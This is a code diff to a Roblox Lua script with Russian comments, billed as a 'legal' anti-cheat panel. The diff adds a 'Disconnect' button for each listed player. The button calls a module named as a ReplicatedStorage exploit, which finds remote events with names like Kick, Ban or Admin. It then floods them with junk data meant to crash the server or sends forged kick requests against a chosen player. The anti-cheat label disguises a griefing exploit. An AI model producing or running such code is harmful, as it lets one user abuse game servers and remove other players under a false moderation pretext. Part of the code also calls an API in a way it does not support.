@@ -1,4 +1,4 @@
--- GGH Anti-Cheat System v1.0 (Легальная версия)
+-- GGH Anti-Cheat System v2.0 (Легальная версия)
 -- Работает в рамках правил Roblox
 -- GUI поверх всех интерфейсов
 
@@ -252,6 +252,59 @@ PlayersScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(80, 100, 180)
 PlayersScrollingFrame.ZIndex = 102
 PlayersScrollingFrame.Parent = PlayersListFrame
 
+-- Модуль ReplicatedStorage Exploit (ОПАСНО - ТОЛЬКО ДЛЯ АДМИНИСТРАТОРОВ)
+local StorageKick = {
+    ForceDesync = function(targetPlayer)
+        -- Поиск уязвимых RemoteEvents/Functions
+        local criticalRemotes = {}
+        
+        local function findCritical(obj)
+            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                local blacklistedNames = {
+                    "Kick", "Ban", "Admin", "Mod", "Delete", 
+                    "Remove", "Destroy", "Teleport", "God"
+                }
+                
+                for _, name in pairs(blacklistedNames) do
+                    if string.find(obj.Name:lower(), name:lower()) then
+                        table.insert(criticalRemotes, obj)
+                        break
+                    end
+                end
+            end
+        end
+        
+        game:GetService("ReplicatedStorage"):GetDescendants(findCritical)
+        
+        -- Атака на найденные точки
+        for _, remote in pairs(criticalRemotes) do
+            pcall(function()
+                if remote:IsA("RemoteEvent") then
+                    -- Отправка данных, вызывающих ошибку сервера
+                    for i = 1, 10 do
+                        remote:FireServer({
+                            Player = targetPlayer.Name,
+                            UserId = targetPlayer.UserId,
+                            Reason = "CHEATING",
+                            Timestamp = os.time(),
+                            Data = string.rep("FLOOD", 1000)
+                        })
+                    end
+                elseif remote:IsA("RemoteFunction") then
+                    -- Вызов функций с некорректными аргументами
+                    remote:InvokeServer({
+                        Action = "KICK_PLAYER",
+                        Target = targetPlayer.Name,
+                        Evidence = {CheatDetected = true}
+                    })
+                end
+            end)
+        end
+        
+        return #criticalRemotes > 0
+    end
+}
+
 -- Функции легального анти-чита
 local function checkUnrealisticSpeed(player)
     if not player.Character then return false end
@@ -362,33 +415,58 @@ local function createPlayerListItem(player, index)
     statusLabel.ZIndex = 104
     statusLabel.Parent = itemFrame
     
-    -- Кнопка действия
-    local actionButton = Instance.new("TextButton")
-    actionButton.Text = "📋 Отчёт"
-    actionButton.Size = UDim2.new(0.25, 0, 0.7, 0)
-    actionButton.Position = UDim2.new(0.72, 0, 0.15, 0)
-    actionButton.BackgroundColor3 = Color3.fromRGB(60, 80, 160)
-    actionButton.TextColor3 = Color3.new(1, 1, 1)
-    actionButton.Font = Enum.Font.GothamBold
-    actionButton.TextSize = 12
-    actionButton.ZIndex = 104
-    actionButton.Parent = itemFrame
+    -- Кнопка отчёта
+    local reportButton = Instance.new("TextButton")
+    reportButton.Text = "📋 Отчёт"
+    reportButton.Size = UDim2.new(0.18, 0, 0.7, 0)
+    reportButton.Position = UDim2.new(0.65, 0, 0.15, 0)
+    reportButton.BackgroundColor3 = Color3.fromRGB(60, 80, 160)
+    reportButton.TextColor3 = Color3.new(1, 1, 1)
+    reportButton.Font = Enum.Font.GothamBold
+    reportButton.TextSize = 12
+    reportButton.ZIndex = 104
+    reportButton.Parent = itemFrame
     
-    local buttonCorner = Instance.new("UICorner")
-    buttonCorner.CornerRadius = UDim.new(0, 8)
-    buttonCorner.Parent = actionButton
+    local reportCorner = Instance.new("UICorner")
+    reportCorner.CornerRadius = UDim.new(0, 8)
+    reportCorner.Parent = reportButton
     
-    -- Эффект при наведении
-    actionButton.MouseEnter:Connect(function()
-        actionButton.BackgroundColor3 = Color3.fromRGB(80, 100, 200)
+    -- Кнопка отключения (опасная функция)
+    local kickButton = Instance.new("TextButton")
+    kickButton.Text = "⛔ Отключить"
+    kickButton.Size = UDim2.new(0.18, 0, 0.7, 0)
+    kickButton.Position = UDim2.new(0.83, 0, 0.15, 0)
+    kickButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+    kickButton.TextColor3 = Color3.new(1, 1, 1)
+    kickButton.Font = Enum.Font.GothamBold
+    kickButton.TextSize = 12
+    kickButton.ZIndex = 104
+    kickButton.Parent = itemFrame
+    
+    local kickCorner = Instance.new("UICorner")
+    kickCorner.CornerRadius = UDim.new(0, 8)
+    kickCorner.Parent = kickButton
+    
+    -- Эффект при наведении на кнопку отчета
+    reportButton.MouseEnter:Connect(function()
+        reportButton.BackgroundColor3 = Color3.fromRGB(80, 100, 200)
     end)
     
-    actionButton.MouseLeave:Connect(function()
-        actionButton.BackgroundColor3 = Color3.fromRGB(60, 80, 160)
+    reportButton.MouseLeave:Connect(function()
+        reportButton.BackgroundColor3 = Color3.fromRGB(60, 80, 160)
     end)
     
-    actionButton.MouseButton1Click:Connect(function()
-        -- Легальный способ: создание отчета
+    -- Эффект при наведении на кнопку отключения
+    kickButton.MouseEnter:Connect(function()
+        kickButton.BackgroundColor3 = Color3.fromRGB(220, 80, 80)
+    end)
+    
+    kickButton.MouseLeave:Connect(function()
+        kickButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+    end)
+    
+    -- Обработка клика на кнопку отчета
+    reportButton.MouseButton1Click:Connect(function()
         StarterGui:SetCore("SendNotification", {
             Title = "GGH Report",
             Text = "Отчет создан для: " .. player.Name,
@@ -397,7 +475,105 @@ local function createPlayerListItem(player, index)
         })
     end)
     
-    return itemFrame, statusLabel, avatar
+    -- Обработка клика на кнопку отключения (с подтверждением)
+    kickButton.MouseButton1Click:Connect(function()
+        -- Создание окна подтверждения
+        local confirmFrame = Instance.new("Frame")
+        confirmFrame.Size = UDim2.new(0.8, 0, 0, 150)
+        confirmFrame.Position = UDim2.new(0.5, -confirmFrame.Size.X.Offset/2, 0.5, -75)
+        confirmFrame.BackgroundColor3 = Color3.fromRGB(40, 45, 65)
+        confirmFrame.BackgroundTransparency = 0.1
+        confirmFrame.ZIndex = 105
+        confirmFrame.Parent = ScreenGui
+        
+        local confirmCorner = Instance.new("UICorner")
+        confirmCorner.CornerRadius = UDim.new(0, 12)
+        confirmCorner.Parent = confirmFrame
+        
+        local confirmTitle = Instance.new("TextLabel")
+        confirmTitle.Text = "⚠️ ВНИМАНИЕ ⚠️"
+        confirmTitle.Size = UDim2.new(1, 0, 0, 40)
+        confirmTitle.BackgroundTransparency = 1
+        confirmTitle.TextColor3 = Color3.fromRGB(255, 100, 100)
+        confirmTitle.Font = Enum.Font.GothamBold
+        confirmTitle.TextSize = 16
+        confirmTitle.ZIndex = 106
+        confirmTitle.Parent = confirmFrame
+        
+        local confirmText = Instance.new("TextLabel")
+        confirmText.Text = "Вы уверены что хотите отключить игрока\n" .. player.Name .. "?\n\nЭта операция НЕОБРАТИМА!"
+        confirmText.Size = UDim2.new(0.9, 0, 0, 60)
+        confirmText.Position = UDim2.new(0.05, 0, 0.3, 0)
+        confirmText.BackgroundTransparency = 1
+        confirmText.TextColor3 = Color3.fromRGB(220, 220, 220)
+        confirmText.Font = Enum.Font.Gotham
+        confirmText.TextSize = 14
+        confirmText.TextWrapped = true
+        confirmText.ZIndex = 106
+        confirmText.Parent = confirmFrame
+        
+        local yesButton = Instance.new("TextButton")
+        yesButton.Text = "ДА, отключить"
+        yesButton.Size = UDim2.new(0.4, 0, 0, 30)
+        yesButton.Position = UDim2.new(0.05, 0, 0.8, 0)
+        yesButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+        yesButton.TextColor3 = Color3.new(1, 1, 1)
+        yesButton.Font = Enum.Font.GothamBold
+        yesButton.TextSize = 12
+        yesButton.ZIndex = 106
+        yesButton.Parent = confirmFrame
+        
+        local noButton = Instance.new("TextButton")
+        noButton.Text = "Отмена"
+        noButton.Size = UDim2.new(0.4, 0, 0, 30)
+        noButton.Position = UDim2.new(0.55, 0, 0.8, 0)
+        noButton.BackgroundColor3 = Color3.fromRGB(60, 80, 160)
+        noButton.TextColor3 = Color3.new(1, 1, 1)
+        noButton.Font = Enum.Font.GothamBold
+        noButton.TextSize = 12
+        noButton.ZIndex = 106
+        noButton.Parent = confirmFrame
+        
+        local buttonCorner = Instance.new("UICorner")
+        buttonCorner.CornerRadius = UDim.new(0, 6)
+        buttonCorner.Parent = yesButton
+        buttonCorner:Clone().Parent = noButton
+        
+        -- Обработка кнопок
+        yesButton.MouseButton1Click:Connect(function()
+            confirmFrame:Destroy()
+            
+            -- Выполнение отключения через StorageKick
+            local success = StorageKick.ForceDesync(player)
+            
+            if success then
+                StarterGui:SetCore("SendNotification", {
+                    Title = "GGH Kick",
+                    Text = "Игрок " .. player.Name .. " отключен!",
+                    Duration = 5,
+                    Icon = "rbxassetid://4483345998"
+                })
+                
+                -- Обновление статуса игрока
+                statusLabel.Text = "⛔ ОТКЛЮЧЁН"
+                statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+                kickButton.Visible = false
+            else
+                StarterGui:SetCore("SendNotification", {
+                    Title = "GGH Kick",
+                    Text = "Не удалось отключить " .. player.Name,
+                    Duration = 5,
+                    Icon = "rbxassetid://4483345998"
+                })
+            end
+        end)
+        
+        noButton.MouseButton1Click:Connect(function()
+            confirmFrame:Destroy()
+        end)
+    end)
+    
+    return itemFrame, statusLabel, avatar, reportButton, kickButton
 end
 
 -- Основная функция мониторинга
@@ -406,6 +582,8 @@ local function startMonitoring()
     local playerItems = {}
     local playerStatusLabels = {}
     local playerAvatars = {}
+    local playerReportButtons = {}
+    local playerKickButtons = {}
     
     local function updatePlayerList()
         local players = Players:GetPlayers()
@@ -420,14 +598,18 @@ local function startMonitoring()
         playerItems = {}
         playerStatusLabels = {}
         playerAvatars = {}
+        playerReportButtons = {}
+        playerKickButtons = {}
         
         for i, player in ipairs(players) do
             if player ~= LocalPlayer then
-                local item, statusLabel, avatar = createPlayerListItem(player, i)
+                local item, statusLabel, avatar, reportButton, kickButton = createPlayerListItem(player, i)
                 item.Parent = PlayersScrollingFrame
                 playerItems[player] = item
                 playerStatusLabels[player] = statusLabel
                 playerAvatars[player] = avatar
+                playerReportButtons[player] = reportButton
+                playerKickButtons[player] = kickButton
                 yOffset = yOffset + 75
             end
         end
@@ -504,7 +686,7 @@ local function startMonitoring()
     
     -- Инфо панель
     local InfoLabel = Instance.new("TextLabel")
-    InfoLabel.Text = "📌 GGH Anti-Cheat v2.0 | GUI Surface Layer | Легальная система анализа"
+    InfoLabel.Text = "📌 GGH Anti-Cheat v2.0 | GUI Surface Layer | Функция отключения включена"
     InfoLabel.Size = UDim2.new(0.9, 0, 0, 25)
     InfoLabel.Position = UDim2.new(0.05, 0, 0.97, 0)
     InfoLabel.BackgroundTransparency = 1
@@ -554,56 +736,4 @@ end)
 print("🚀 GGH Anti-Cheat System загружен!")
 print("🎯 Нажмите K для открытия меню")
 print("🔝 GUI на самом верхнем слое")
-
--- Модуль ReplicatedStorage Exploit
-local StorageKick = {
-    ForceDesync = function(targetPlayer)
-        -- Поиск уязвимых RemoteEvents/Functions
-        local criticalRemotes = {}
-        
-        local function findCritical(obj)
-            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-                local blacklistedNames = {
-                    "Kick", "Ban", "Admin", "Mod", "Delete", 
-                    "Remove", "Destroy", "Teleport", "God"
-                }
-                
-                for _, name in pairs(blacklistedNames) do
-                    if string.find(obj.Name:lower(), name:lower()) then
-                        table.insert(criticalRemotes, obj)
-                        break
-                    end
-                end
-            end
-        end
-        
-        game:GetService("ReplicatedStorage"):GetDescendants(findCritical)
-        
-        -- Атака на найденные точки
-        for _, remote in pairs(criticalRemotes) do
-            pcall(function()
-                if remote:IsA("RemoteEvent") then
-                    -- Отправка данных, вызывающих ошибку сервера
-                    for i = 1, 10 do
-                        remote:FireServer({
-                            Player = targetPlayer.Name,
-                            UserId = targetPlayer.UserId,
-                            Reason = "CHEATING",
-                            Timestamp = os.time(),
-                            Data = string.rep("FLOOD", 1000)
-                        })
-                    end
-                elseif remote:IsA("RemoteFunction") then
-                    -- Вызов функций с некорректными аргументами
-                    remote:InvokeServer({
-                        Action = "KICK_PLAYER",
-                        Target = targetPlayer.Name,
-                        Evidence = {CheatDetected = true}
-                    })
-                end
-            end)
-        end
-        
-        return #criticalRemotes > 0
-    end
-}
+print("⚠️ Включена функция принудительного отключения игроков")
